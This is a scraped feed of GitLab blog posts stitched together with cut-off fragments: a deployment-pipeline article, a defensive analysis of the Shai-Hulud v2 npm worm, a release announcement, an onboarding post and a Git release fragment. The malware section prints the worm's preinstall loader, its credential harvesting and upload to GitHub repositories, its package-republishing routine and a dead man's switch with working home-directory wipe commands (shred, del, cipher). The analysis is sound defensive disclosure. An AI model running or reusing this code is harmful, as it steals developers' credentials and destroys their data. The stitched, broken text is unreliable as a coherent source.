GitLab running simultaneously and they all need to play nicely together.</p>\n<h2>Database operations</h2>\n<p>Database migrations present a unique challenge in our Canary deployment model. We need schema changes to support new features while maintaining our ability to roll back if issues arise. Our solution involves careful separation of concerns:</p>\n<ul>\n<li>\n<p><strong>Regular migrations:</strong> Run during the Canary stage, designed to be backward-compatible, consists of only reversible changes</p>\n</li>\n<li>\n<p><strong>Post-deploy migrations:</strong> The &quot;point of no return&quot; migrations that happen only after multiple successful deployments</p>\n</li>\n</ul>\n<p>Database changes are handled with precision and extensive validation procedures:</p>\n<pre><code class=\"language-mermaid\">  graph LR\n      A[Regular Migrations] --&gt; B[Canary Stage Deploy]\n      B --&gt; C[Main Stage Deploy]\n      C --&gt; D[Post Deploy Migrations]\n\n</code></pre>\n<h3>Post-deploy migrations</h3>\n<p>GitLab deployments involve many components. Updating GitLab is not atomic, so many components must be backward-compatible.</p>\n<p>Post-deploy migrations often contain changes that can't be easily rolled back — think data transformations, column drops, or structural changes that would break older code versions. By running them <em>after</em> we've gained confidence through multiple successful deployments, we ensure:</p>\n<ol>\n<li>\n<p><strong>The new code is stable</strong> and we're unlikely to need a rollback</p>\n</li>\n<li>\n<p><strong>Performance characteristics</strong> are well understood in production</p>\n</li>\n<li>\n<p><strong>Any edge cases</strong> have been discovered and addressed</p>\n</li>\n<li>\n<p><strong>The blast radius</strong> is minimized if something does go wrong</p>\n</li>\n</ol>\n<p>This approach provides the optimal balance: enabling rapid feature deployment through Canary releases while maintaining rollback capabilities until we have high confidence in deployment stability.</p>\n<p><strong>The expand-migrate-contract pattern:</strong> Our database, frontend, and application compatibility changes follow a carefully orchestrated three-phase approach.</p>\n<ol>\n<li>\n<p><strong>Expand:</strong> Add new structures (columns, indexes) while keeping old ones functional</p>\n</li>\n<li>\n<p><strong>Migrate:</strong> Deploy new application code that uses the new structures</p>\n</li>\n<li>\n<p><strong>Contract:</strong> Remove old structures in post-deploy migrations after everything is stable</p>\n</li>\n</ol>\n<p><strong>Real-world example:</strong> When adding a new <code>merge_readiness</code> column to merge requests:</p>\n<ol>\n<li>\n<p><strong>Expand:</strong> Add the new column with a default value; existing code ignores it</p>\n</li>\n<li>\n<p><strong>Migrate:</strong> Deploy code that reads and writes to the new column while still supporting the old approach</p>\n</li>\n</ol>\n<p>3 <strong>Contract:</strong> After several successful deployments, remove the old column in a post-deploy migration</p>\n<p>All database operations, application code, frontend code, and more, are subject to a set of guidelines that Engineering must adhere to, which can be found in our <a href=\"https://docs.gitlab.com/development/multi_version_compatibility/\">Multi-Version Compatibility documentation</a>.</p>\n<h2>Results and impact</h2>\n<p>Our deployment infrastructure delivers measurable benefits:</p>\n<p><strong>For GitLab</strong></p>\n<ul>\n<li>Up to 12 deployments daily to GitLab.com</li>\n<li>Zero-downtime deployments serving millions of developers</li>\n<li>Security patches can reach production within hours, not days</li>\n<li>New features validated in production at massive scale before general availability</li>\n</ul>\n<p><strong>For customers</strong></p>\n<ul>\n<li>Proven deployment patterns you can adopt for your own applications</li>\n<li>Features battle-tested on the world's largest GitLab instance before reaching your environment</li>\n<li>Documentation that reflects actual production practices, not theoretical best practices</li>\n<li>Confidence that GitLab's recommended upgrade procedures work at any scale</li>\n</ul>\n<h2>Key takeaways for engineering teams</h2>\n<p>GitLab's deployment pipeline represents a sophisticated system that balances deployment velocity with operational reliability. The progressive deployment model, comprehensive testing integration, and robust rollback capabilities provide a foundation for reliable software delivery at scale.</p>\n<p>For engineering teams implementing similar systems, key considerations include:</p>\n<ul>\n<li>\n<p><strong>Automated testing:</strong> Comprehensive test coverage throughout the deployment pipeline</p>\n</li>\n<li>\n<p><strong>Progressive rollout:</strong> Staged deployments to minimize risk and enable rapid recovery</p>\n</li>\n<li>\n<p><strong>Monitoring integration:</strong> Comprehensive observability across all deployment stages</p>\n</li>\n<li>\n<p><strong>Incident response:</strong> Rapid detection and resolution capabilities for deployment issues</p>\n</li>\n</ul>\n<p>GitLab's architecture demonstrates how modern CI/CD systems can manage the complexity of large-scale deployments while maintaining the velocity required for competitive software development.</p>\n<h2>Important note on scope</h2>\n<p>This article specifically covers the deployment pipeline for services that are part of the <strong>GitLab Omnibus package</strong> and <strong>Helm chart</strong> — essentially the core GitLab monolith and its tightly integrated components.</p>\n<p>However, GitLab's infrastructure landscape extends beyond what's described here.

Our internal monitoring system has uncovered multiple infected packages containing what appears to be an evolved version of the &quot;<a href=\"https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem\">Shai-Hulud</a>&quot; malware.</p>\n<p>Early analysis shows worm-like propagation behavior that automatically infects additional packages maintained by impacted developers. Most critically, we've discovered the malware contains a &quot;<strong>dead man's switch</strong>&quot; mechanism that threatens to destroy user data if its propagation and exfiltration channels are severed.</p>\n<p><strong>We verified that GitLab was not using any of the malicious packages and are sharing our findings to help the broader security community respond effectively.</strong></p>\n<h2>Inside the attack</h2>\n<p>Our internal monitoring system, which scans open-source package registries for malicious packages, has identified multiple npm packages infected with sophisticated malware that:</p>\n<ul>\n<li>Harvests credentials from GitHub, npm, AWS, GCP, and Azure</li>\n<li>Exfiltrates stolen data to attacker-controlled GitHub repositories</li>\n<li>Propagates by automatically infecting other packages owned by victims</li>\n<li><strong>Contains a destructive payload that triggers if the malware loses access to its infrastructure</strong></li>\n</ul>\n<p>While we've confirmed several infected packages, the worm-like propagation mechanism means many more packages are likely compromised. The investigation is ongoing as we work to understand the full scope of this campaign.</p>\n<h2>Technical analysis: How the attack unfolds</h2>\n<p><img alt=\"mermaid chart of how the attack unfolds\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1764040799/igbsaqqvlwjqbrnxmh8k.png\" /></p>\n<h3>Initial infection vector</h3>\n<p>The malware infiltrates systems through a carefully crafted multi-stage loading process. Infected packages contain a modified <code>package.json</code> with a preinstall script pointing to <code>setup_bun.js</code>. This loader script appears innocuous, claiming to install the Bun JavaScript runtime, which is a legitimate tool. However, its true purpose is to establish the malware's execution environment.</p>\n<pre><code class=\"language-javascript\">// This file gets added to victim's packages as setup_bun.js\n#!/usr/bin/env node\nasync function downloadAndSetupBun() {\n  // Downloads and installs bun\n  let command = process.platform === 'win32' \n    ? 'powershell -c &quot;irm bun.sh/install.ps1|iex&quot;'\n    : 'curl -fsSL https://bun.sh/install | bash';\n  \n  execSync(command, { stdio: 'ignore' });\n  \n  // Runs the actual malware\n  runExecutable(bunPath, ['bun_environment.js']);\n}\n</code></pre>\n<p>The <code>setup_bun.js</code> loader downloads or locates the Bun runtime on the system, then executes the bundled <code>bun_environment.js</code> payload, a 10MB obfuscated file already present in the infected package. This approach provides multiple layers of evasion: the initial loader is small and seemingly legitimate, while the actual malicious code is heavily obfuscated and bundled into a file too large for casual inspection.</p>\n<h3>Credential harvesting</h3>\n<p>Once executed, the malware immediately begins credential discovery across multiple sources:</p>\n<ul>\n<li><strong>GitHub tokens</strong>: Searches environment variables and GitHub CLI configurations for tokens starting with <code>ghp_</code> (GitHub personal access token) or <code>gho_</code>(GitHub OAuth token)</li>\n<li><strong>Cloud credentials</strong>: Enumerates AWS, GCP, and Azure credentials using official SDKs, checking environment variables, config files, and metadata services</li>\n<li><strong>npm tokens</strong>: Extracts tokens for package publishing from <code>.npmrc</code> files and environment variables, which are common locations for securely storing sensitive configuration and credentials.</li>\n<li><strong>Filesystem scanning</strong>: Downloads and executes Trufflehog, a legitimate security tool, to scan the entire home directory for API keys, passwords, and other secrets hidden in configuration files, source code, or git history</li>\n</ul>\n<pre><code class=\"language-javascript\">async function scanFilesystem() {\n  let scanner = new Trufflehog();\n  await scanner.initialize();\n  \n  // Scan user's home directory for secrets\n  let findings = await scanner.scanFilesystem(os.homedir());\n  \n  // Upload findings to exfiltration repo\n  await github.saveContents(&quot;truffleSecrets.json&quot;, \n    JSON.stringify(findings));\n}\n</code></pre>\n<h3>Data exfiltration network</h3>\n<p>The malware uses stolen GitHub tokens to create public repositories with a specific marker in their description: &quot;Sha1-Hulud: The Second Coming.&quot; These repositories serve as dropboxes for stolen credentials and system information.</p>\n<pre><code class=\"language-javascript\">async function createRepo(name) {\n  // Creates a repository with a specific description marker\n  let repo = await this.octokit.repos.createForAuthenticatedUser({\n    name: name,\n    description: &quot;Sha1-Hulud: The Second Coming.&quot;, // Marker for finding repos later\n    private: false,\n    auto_init: false,\n    has_discussions: true\n  });\n  \n  // Install GitHub Actions runner for persistence\n  if (await this.checkWorkflowScope()) {\n    let token = await this.octokit.request(\n      &quot;POST /repos/{owner}/{repo}/actions/runners/registration-token&quot;\n    );\n    await installRunner(token); // Installs self-hosted runner\n  }\n  \n  return repo;\n}\n</code></pre>\n<p>Critically, if the initial GitHub token lacks sufficient permissions, the malware searches for other compromised repositories with the same marker, allowing it to retrieve tokens from other infected systems. This creates a resilient botnet-like network where compromised systems share access tokens.</p>\n<pre><code class=\"language-javascript\">// How the malware network shares tokens:\nasync fetchToken() {\n  // Search GitHub for repos with the identifying marker\n  let results = await this.octokit.search.repos({\n    q: '&quot;Sha1-Hulud: The Second Coming.&quot;',\n    sort: &quot;updated&quot;\n  });\n  \n  // Try to retrieve tokens from compromised repos\n  for (let repo of results) {\n    let contents = await fetch(\n      `https://raw.githubusercontent.com/${repo.owner}/${repo.name}/main/contents.json`\n    );\n    \n    let data = JSON.parse(Buffer.from(contents, 'base64').toString());\n    let token = data?.modules?.github?.token;\n    \n    if (token &amp;&amp; await validateToken(token)) {\n      return token;  // Use token from another infected system\n    }\n  }\n  return null;  // No valid tokens found in network\n}\n</code></pre>\n<h3>Supply chain propagation</h3>\n<p>Using stolen npm tokens, the malware:</p>\n<ol>\n<li>Downloads all packages maintained by the victim</li>\n<li>Injects the <code>setup_bun.js</code> loader into each package's preinstall scripts</li>\n<li>Bundles the malicious <code>bun_environment.js</code> payload</li>\n<li>Increments the package version number</li>\n<li>Republishes the infected packages to npm</li>\n</ol>\n<pre><code class=\"language-javascript\">async function updatePackage(packageInfo) {\n  // Download original package\n  let tarball = await fetch(packageInfo.tarballUrl);\n  \n  // Extract and modify package.json\n  let packageJson = JSON.parse(await readFile(&quot;package.json&quot;));\n  \n  // Add malicious preinstall script\n  packageJson.scripts.preinstall = &quot;node setup_bun.js&quot;;\n  \n  // Increment version\n  let version = packageJson.version.split(&quot;.&quot;).map(Number);\n  version[2] = (version[2] || 0) + 1;\n  packageJson.version = version.join(&quot;.&quot;);\n  \n  // Bundle backdoor installer\n  await writeFile(&quot;setup_bun.js&quot;, BACKDOOR_CODE);\n  \n  // Repackage and publish\n  await Bun.$`npm publish ${modifiedPackage}`.env({\n    NPM_CONFIG_TOKEN: this.token\n  });\n}\n</code></pre>\n<h2>The dead man's switch</h2>\n<p>Our analysis uncovered a destructive payload designed to protect the malware’s infrastructure against takedown attempts.</p>\n<p>The malware continuously monitors its access to GitHub (for exfiltration) and npm (for propagation). If an infected system loses access to both channels simultaneously, it triggers immediate data destruction on the compromised machine. On Windows, it attempts to delete all user files and overwrite disk sectors. On Unix systems, it uses <code>shred</code> to overwrite files before deletion, making recovery nearly impossible.</p>\n<pre><code class=\"language-javascript\">// CRITICAL: Token validation failure triggers destruction\nasync function aL0() {\n  let githubApi = new dq();\n  let npmToken = process.env.NPM_TOKEN || await findNpmToken();\n  \n  // Try to find or create GitHub access\n  if (!githubApi.isAuthenticated() || !githubApi.repoExists()) {\n    let fetchedToken = await githubApi.fetchToken(); // Search for tokens in compromised repos\n    \n    if (!fetchedToken) {  // No GitHub access possible\n      if (npmToken) {\n        // Fallback to NPM propagation only\n        await El(npmToken);\n      } else {\n        // DESTRUCTION TRIGGER: No GitHub AND no NPM access\n        console.log(&quot;Error 12&quot;);\n        if (platform === &quot;windows&quot;) {\n          // Attempts to delete all user files and overwrite disk sectors\n          Bun.spawnSync([&quot;cmd.exe&quot;, &quot;/c&quot;, \n            &quot;del /F /Q /S \\&quot;%USERPROFILE%*\\&quot; &amp;&amp; &quot; +\n            &quot;for /d %%i in (\\&quot;%USERPROFILE%*\\&quot;) do rd /S /Q \\&quot;%%i\\&quot; &amp; &quot; +\n            &quot;cipher /W:%USERPROFILE%&quot;  // Overwrite deleted data\n          ]);\n        } else {\n          // Attempts to shred all writable files in home directory\n          Bun.spawnSync([&quot;bash&quot;, &quot;-c&quot;, \n            &quot;find \\&quot;$HOME\\&quot; -type f -writable -user \\&quot;$(id -un)\\&quot; -print0 | &quot; +\n            &quot;xargs -0 -r shred -uvz -n 1 &amp;&amp; &quot; +  // Overwrite and delete\n            &quot;find \\&quot;$HOME\\&quot; -depth -type d -empty -delete&quot;  // Remove empty dirs\n          ]);\n        }\n        process.exit(0);\n      }\n    }\n  }\n}\n</code></pre>\n<p>This creates a dangerous scenario. If GitHub mass-deletes the malware's repositories or npm bulk-revokes compromised tokens, thousands of infected systems could simultaneously destroy user data. The distributed nature of the attack means that each infected machine independently monitors access and will trigger deletion of the user’s data when a takedown is detected.</p>\n<h2>Indicators of compromise</h2>\n<p>To aid in detection and response, here is a more comprehensive list of the key indicators of compromise (IoCs) identified during our analysis.</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\">Type</th>\n<th style=\"text-align: left;\">Indicator</th>\n<th style=\"text-align: left;\">Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\"><strong>file</strong></td>\n<td style=\"text-align: left;\"><code>bun_environment.js</code></td>\n<td style=\"text-align: left;\">Malicious post-install script in node_modules directories</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>directory</strong></td>\n<td style=\"text-align: left;\"><code>.truffler-cache/</code></td>\n<td style=\"text-align: left;\">Hidden directory created in user home for Trufflehog binary storage</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>directory</strong></td>\n<td style=\"text-align: left;\"><code>.truffler-cache/extract/</code></td>\n<td style=\"text-align: left;\">Temporary directory used for binary extraction</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>file</strong></td>\n<td style=\"text-align: left;\"><code>.truffler-cache/trufflehog</code></td>\n<td style=\"text-align: left;\">Downloaded Trufflehog binary (Linux/Mac)</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>file</strong></td>\n<td style=\"text-align: left;\"><code>.truffler-cache/trufflehog.exe</code></td>\n<td style=\"text-align: left;\">Downloaded Trufflehog binary (Windows)</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>process</strong></td>\n<td style=\"text-align: left;\"><code>del /F /Q /S &quot;%USERPROFILE%*&quot;</code></td>\n<td style=\"text-align: left;\">Windows destructive payload command</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>process</strong></td>\n<td style=\"text-align: left;\"><code>shred -uvz -n 1</code></td>\n<td style=\"text-align: left;\">Linux/Mac destructive payload command</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>process</strong></td>\n<td style=\"text-align: left;\"><code>cipher /W:%USERPROFILE%</code></td>\n<td style=\"text-align: left;\">Windows secure deletion command in payload</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>command</strong></td>\n<td style=\"text-align: left;\">`curl -fsSL https://bun.sh/install</td>\n<td style=\"text-align: left;\">bash`</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>command</strong></td>\n<td style=\"text-align: left;\">`powershell -c &quot;irm bun.sh/install.ps1</td>\n<td style=\"text-align: left;\">iex&quot;`</td>\n</tr>\n</tbody>\n</table>\n<h2>How GitLab can help you detect this malware campaign</h2>\n<p>If you are using GitLab Ultimate, you can leverage built-in security capabilities to immediately surface exposure tied to this attack within your projects.</p>\n<p>First, enable <a href=\"https://docs.gitlab.com/user/application_security/dependency_scanning/dependency_scanning_sbom/\"><strong>Dependency Scanning</strong></a> to automatically analyze your project's dependencies against known vulnerability databases. <strong>If infected packages are present in your <code>package-lock.json</code> or <code>yarn.lock</code> files, Dependency Scanning will flag them in your pipeline results and the Vulnerability Report.</strong> For complete setup instructions, refer to the <a href=\"https://docs.gitlab.com/user/application_security/dependency_scanning/dependency_scanning_sbom/#enabling-the-analyzer\">Dependency Scanning documentation</a>.</p>\n<p>Once enabled, merge requests introducing a compromised package will surface a warning before the code reaches your main branch.</p>\n<p>Next, <a href=\"https://docs.gitlab.com/user/gitlab_duo_chat/agentic_chat/\"><strong>GitLab Duo Chat</strong></a> can be used with Dependency Scanning to provide a fast way to check your project's exposure without navigating through reports. From the dropdown, select the <a href=\"https://docs.gitlab.com/user/duo_agent_platform/agents/foundational_agents/security_analyst_agent/\">Security Analyst Agent</a> and simply ask questions like:</p>\n<ul>\n<li>&quot;Are any of my dependencies affected by the Shai-Hulud v2 malware campaign?&quot;</li>\n<li>&quot;Does this project have any npm supply chain vulnerabilities?&quot;</li>\n<li>&quot;Does this project have any npm supply chain vulnerabilities?&quot;</li>\n<li>&quot;Show me critical vulnerabilities in my JavaScript dependencies.&quot;</li>\n</ul>\n<p>The agent will query your project's vulnerability data and provide a direct answer, helping security teams triage quickly across multiple projects.</p>\n<p><img alt=\"GitLab Security Analyst Agent findings\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1764196041/ciwroqeub2ayhjcbajec.png\" /></p>\n<p>For teams managing many repositories, we recommend combining these approaches: use Dependency Scanning for continuous automated detection in CI/CD, and the Security Analyst Agent for ad-hoc investigation and rapid response during active incidents like this one.</p>\n<h2>Looking ahead</h2>\n<p>This campaign represents an evolution in supply chain attacks where the threat of collateral damage becomes the primary defense mechanism for the attacker's infrastructure. The investigation is ongoing as we work with the community to understand the full scope and develop safe remediation strategies.</p>\n<p>GitLab's automated detection systems continue to monitor for new infections and variations of this attack. By sharing our findings early, we hope to help the community respond effectively while avoiding the pitfalls created by the malware's dead man's switch design.</p>",

      "summary": "<p><em>Editor’s note: After this blog was originally published, the default Security Manager role was withdrawn from the release. It will be included in a future update. The content below has been updated for accuracy.</em></p>\n<p>With <a href=\"https://about.gitlab.com/releases/2025/11/20/gitlab-18-6-released/\">GitLab 18.6</a>, we’re continuing to advance how AI integrates into everyday software development with enhancements that give teams greater choice and control. GitLab 18.6 will help plan, build, and secure software more intelligently across the entire software lifecycle.\nTeams now have greater flexibility to select the right models for their workflows, extend AI into secure and self-managed environments, and strengthen visibility and governance across every stage of development.</p>\n<h2>AI that adapts to you</h2>\n<p>With 18.6, GitLab’s AI becomes more adaptable to real-world workflows. GitLab Duo Agents now plan with greater context, work seamlessly across IDEs and self-managed instances, and offer new open-source model options — helping teams accelerate delivery without compromising compliance or control.</p>\n<p><strong>GitLab Duo Planner and Security Analyst agent enhancements</strong></p>\n<p>In 18.6, <a href=\"https://about.gitlab.com/blog/ace-your-planning-without-the-context-switching/\">GitLab Duo Planner</a> and <a href=\"https://docs.gitlab.com/user/duo_agent_platform/agents/foundational_agents/security_analyst_agent/\">GitLab Duo Security Analyst</a> are now available by default in the Agentic Chat dropdown — no configuration or setup required. Both agents can be used immediately across projects and groups, giving teams built-in assistance for planning, issue refinement, and security analysis.</p>\n<p>GitLab Duo Planner agent now works at the group level with awareness of the epic being viewed and supports milestone and iteration workflows. Security Analyst agent provides automated vulnerability review, context interpretation, and guided remediation suggestions. Both agents are also available to self-managed customers.</p>\n<p>For a full list of what these agents can do, see the <a href=\"https://docs.gitlab.com/user/duo_agent_platform/agents/foundational_agents/\">documentation</a>.</p>\n<p><strong>gpt-oss-120b model support for GitLab Duo Agent Platform</strong></p>\n<p>GitLab Duo Self-Hosted customers can now deploy the <a href=\"https://platform.openai.com/docs/models/gpt-oss-120b\"><strong>gpt-oss-120b</strong></a> model within the GitLab Duo Agent Platform — a high-performance, fully open-source model optimized for agentic workflows. This addition enables teams to execute complex tasks and reasoning-driven processes while maintaining control over model transparency and infrastructure. For organizations that require open, auditable models to address compliance or data sovereignty requirements, gpt-oss-120b provides a reliable alternative to proprietary models without sacrificing performance.</p>\n<p>For more information on supported models, please see our <a href=\"https://docs.gitlab.com/administration/gitlab_duo_self_hosted/supported_models_and_hardware_requirements/#supported-models\">documentation</a>.</p>\n<p><strong>End-user model selection for cloud-connected self-managed instances (GA)</strong></p>\n<p>Cloud-connected self-managed end users can now choose which AI model powers their GitLab Duo Agentic Chat experience directly from the GitLab UI. This gives administrators and end users more control over how conversations perform and how costs and governance requirements are managed.</p>\n<p>No matter the deployment environment — on-premises, private cloud, or public cloud —  teams can select regionally compliant or in-house models to help satisfy data residency needs and compare model quality for speed or accuracy. This flexibility ensures that every organization can tailor Agentic Chat to its operational priorities.</p>\n<p>For full details on how to select a model in Agentic Chat, see the model selection section of the GitLab <a href=\"https://docs.gitlab.com/user/gitlab_duo_chat/agentic_chat/#select-a-model\">documentation</a>.</p>\n<p><strong>Web IDE support for air-gapped deployments</strong></p>\n<p>Air-gapped or tightly controlled environments — such as public sector organizations, defense agencies, and regulated enterprises — can now run the Web IDE with full functionality even without internet access. By allowing administrators to configure their own Web IDE extension host domain, GitLab enables markdown preview, code editing, and GitLab Duo Chat capabilities in isolated or offline systems. This makes it possible for development teams in secure or restricted networks to benefit from modern IDE workflows without sacrificing security and compliance.</p>\n<p><strong>Modern interface now default for self-managed instances</strong></p>\n<p>Self-managed GitLab instances now default to the modern interface in 18.6, bringing the same streamlined experience already available on GitLab.com to on-premises deployments. The updated layout improves navigation consistency and makes core workflows more intuitive across the platform. Administrators maintain full flexibility with opt-out controls via feature flag or user-level toggling if needed. This update ensures self-managed customers benefit from GitLab's latest interface improvements while maintaining the control and customization options enterprise environments require.</p>\n<h2>Platform security with awareness and authority</h2>\n<p>GitLab 18.6 strengthens platform security with deeper context and clearer control, helping security teams focus on the risks that matter most while maintaining governance across every project.</p>\n<p><strong>Security attributes and context filtering</strong></p>\n<p>Security teams can now apply custom business context labels to projects and groups, transforming raw scan results into prioritized, risk-based insights. Instead of viewing vulnerabilities in isolation, teams can tag projects by business unit, application type, or criticality — then filter and sort security data by impact. This allows organizations to focus remediation on the areas of greatest business risk, helping to accelerate time to resolution for the issues that matter most.</p>\n<h2>AI that adapts to your workflow</h2>\n<p>This release represents more than new capabilities — it's about how GitLab Duo Agent Platform is becoming an embedded part of everyday software development workflows.

      "link": "https://about.gitlab.com/blog/gitlab-engineer-how-i-improved-my-onboarding-experience-with-ai/",
      "published": "2025-11-17T00:00:00.000Z",
      "summary": "<p>Starting a new job is exciting, and overwhelming. New teammates, new tools, and, in GitLab’s case, a lot of documentation. Six weeks ago, I joined GitLab’s Growth team as a fullstack engineer. Anyone who has gone through <a href=\"https://about.gitlab.com/the-source/platform/how-to-accelerate-developer-onboarding-and-why-it-matters/\">onboarding at GitLab</a> knows it’s transparent, extensive, and thorough.</p>\n<p>GitLab's onboarding process includes a lot of docs, videos, and trainings that will bring you up to speed. Also, in line with GitLab's values, my team encouraged me to start contributing right away. I quickly realized that onboarding here is both diligent and intense. Luckily, I had a secret helper: <a href=\"https://about.gitlab.com/gitlab-duo/\">GitLab Duo</a>.</p>\n<h2>My main use cases</h2>\n<p>I’ve found GitLab Duo's AI assistance, available throughout the software development lifecycle, useful in three key areas: exploration, reviewing, and debugging. With GitLab Duo, I was able to get my first tiny MR deployed to production in the first week and actively contribute to <a href=\"https://about.gitlab.com/releases/2025/10/16/gitlab-18-5-released/#pick-up-where-you-left-off-on-the-new-personal-homepage\">the personal homepage</a> in GitLab 18.5 in the weeks after.</p>\n<h3>Exploration</h3>\n<p>Early in onboarding, I often remembered reading something but couldn’t recall where. GitLab has a <a href=\"https://handbook.gitlab.com/\">public-facing handbook</a>, an internal handbook, and <a href=\"https://docs.gitlab.com/\">GitLab Docs</a>. It can be difficult to search across all of them efficiently.</p>\n<p>GitLab Duo simplifies this task: I can describe what I’m looking for in natural language via <a href=\"https://docs.gitlab.com/user/gitlab_duo_chat/\">GitLab Duo Chat</a> and search across all resources at once.</p>\n<p>Example prompt:</p>\n<blockquote>\n<p>I remember reading about how RSpec tests are done at GitLab. Can you find relevant documentation across the Handbook, the internal handbook and the GitLab Docs?</p>\n</blockquote>\n<p>Before starting work on an issue, I use GitLab Duo to identify edge cases and hidden dependencies. GitLab Duo will relate the requirements of the issue against the whole GitLab codebase, assess similar features, and prepare all the findings. Based on its output I am able to refine the issue with my product manager and designer, and make sure my implementation covers all edge cases or define future iterations.</p>\n<p>Example prompt:</p>\n<blockquote>\n<p>Analyze this issue in the context of its epic and identify:</p>\n<ul>\n<li>Implementation questions to ask PM/design before coding</li>\n<li>Edge cases not covered in requirements</li>\n<li>Cross-feature dependencies that might be affected</li>\n<li>Missing acceptance criteria</li>\n</ul>\n</blockquote>\n<p>I also check that my planned solution follows GitLab best practices and common patterns.</p>\n<p>Example prompt:</p>\n<blockquote>\n<p>I want to implement XZY behavior — how is this usually done at GitLab, and what other options do I have?</p>\n</blockquote>\n<h3>Reviewing</h3>\n<p>I always <a href=\"https://docs.gitlab.com/user/project/merge_requests/duo_in_merge_requests/#have-gitlab-duo-review-your-code\">let GitLab Duo review my merge requests</a> before assigning human reviewers. It often catches small mistakes, suggests improvements, and highlights edge cases I missed. This shortens the review cycle and helps my teammates focus on more complex and bigger-picture feedback.</p>\n<p>Since I’m still new to GitLab’s codebase and coding practices, some review comments are hard to interpret. In those cases, GitLab Duo helps me understand what a reviewer means and how it relates to my code.</p>\n<p>Example prompt:</p>\n<blockquote>\n<p>I don’t understand the comment on this MR about following the user instead of testing component internals, what does it mean and how does it relate to my implementation?</p>\n</blockquote>\n<h3>Debugging</h3>\n<p>Sometimes pipeline tests on my merge requests failed unexpectedly. If I can’t tell whether my changes are the cause, GitLab Duo helps me investigate and fix the failures. Using <a href=\"https://docs.gitlab.com/user/gitlab_duo_chat/agentic_chat/\">GitLab Duo Agentic Chat</a>, Duo can apply changes to debug the failing job.</p>\n<p>Example prompt:</p>\n<blockquote>\n<p>The pipeline job “rspec system pg16 12/32” is failing, but I don’t know whether that relates to my changes. Can you check, if my changes are causing the pipeline failure and, if so, guide me through the steps of fixing it.</p>\n</blockquote>\n<h2>How Duo aligns with GitLab’s values</h2>\n<p>Using GitLab Duo doesn’t just help me, it also supports <a href=\"https://handbook.gitlab.com/handbook/values/\">GitLab’s CREDIT values</a>:</p>\n<ul>\n<li>\n<p><strong>Collaboration:</strong> I ask teammates fewer basic questions. And when I do ask questions, they’re more thoughtful and informed. This respects their time.</p>\n</li>\n<li>\n<p><strong>Results for customers:</strong> By identifying edge cases early and improving code quality, GitLab Duo helps me deliver better outcomes for customers.</p>\n</li>\n<li>\n<p><strong>Efficiency:</strong> Streamlined preparation, faster reviews, and improved debugging make me more efficient.</p>\n</li>\n<li>\n<p><strong>Diversity, inclusion &amp; belonging:</strong> AI guidance might mitigate misunderstandings and different barriers to entry based on differing backgrounds and abilities.</p>\n</li>\n<li>\n<p><strong>Iteration:</strong> The ability to try ideas faster and identify potential improvements, enables faster iteration.</p>\n</li>\n<li>\n<p><strong>Transparency:</strong> GitLab Duo makes the already transparent documentation at GitLab more accessible.</p>\n</li>\n</ul>\n<h2>Staying cautious with AI</h2>\n<p>It never has been as easy and difficult to be competent as in the days of AI. It can be a powerful tool, but AI does get things wrong. Therefore, I avoid <a href=\"https://link.springer.com/article/10.1007/s00146-025-02422-7\">automation bias</a> by always validating AI's outputs.

After a relatively short 8-week <a href=\"https://about.gitlab.com/blog/what-s-new-in-git-2-51-0/\">release cycle for 2.51</a>, due to summer in the Northern Hemisphere, this release is back to the usual 12-week cycle. Let’s look at some notable changes, including contributions from the GitLab Git team and the wider Git community.</p>\n<h2>New git-last-modified(1) command</h2>\n<p>Many Git forges like GitLab display files in a tree view like this:</p>\n<table>\n<thead>\n<tr>\n<th>Name</th>\n<th>Last commit</th>\n<th>Last update</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>README.md</td>\n<td>README: *.txt -&gt; *.adoc fixes</td>\n<td>4 months ago</td>\n</tr>\n<tr>\n<td>RelNotes</td>\n<td>Start 2.51 cycle, the first batch</td>\n<td>4 weeks ago</td>\n</tr>\n<tr>\n<td>SECURITY.md</td>\n<td>SECURITY: describe how to report vulnerabilities</td>\n<td>4 years</td>\n</tr>\n<tr>\n<td>abspath.c</td>\n<td>abspath: move related functions to abspath</td>\n<td>2 years</td>\n</tr>\n<tr>\n<td>abspath.h</td>\n<td>abspath: move related functions to abspath</td>\n<td>2 years</td>\n</tr>\n<tr>\n<td>aclocal.m4</td>\n<td>configure: use AC_LANG_PROGRAM consistently</td>\n<td>15 years ago</td>\n</tr>\n<tr>\n<td>add-patch.c</td>\n<td>pager: stop using <code>the_repository</code></td>\n<td>7 months ago</td>\n</tr>\n<tr>\n<td>advice.c</td>\n<td>advice: allow disabling default branch name advice</td>\n<td>4 months ago</td>\n</tr>\n<tr>\n<td>advice.h</td>\n<td>advice: allow disabling default branch name advice</td>\n<td>4 months ago</td>\n</tr>\n<tr>\n<td>alias.h</td>\n<td>rebase -m: fix serialization of strategy options</td>\n<td>2 years</td>\n</tr>\n<tr>\n<td>alloc.h</td>\n<td>git-compat-util: move alloc macros to git-compat-util.h</td>\n<td>2 years ago</td>\n</tr>\n<tr>\n<td>apply.c</td>\n<td>apply: only write intents to add for new files</td>\n<td>8 days ago</td>\n</tr>\n<tr>\n<td>archive.c</td>\n<td>Merge branch 'ps/parse-options-integers'</td>\n<td>3 months ago</td>\n</tr>\n<tr>\n<td>archive.h</td>\n<td>archive.h: remove unnecessary include</td>\n<td>1 year</td>\n</tr>\n<tr>\n<td>attr.h</td>\n<td>fuzz: port fuzz-parse-attr-line from OSS-Fuzz</td>\n<td>9 months ago</td>\n</tr>\n<tr>\n<td>banned.h</td>\n<td>banned.h: mark <code>strtok()</code> and <code>strtok_r()</code> as banned</td>\n<td>2 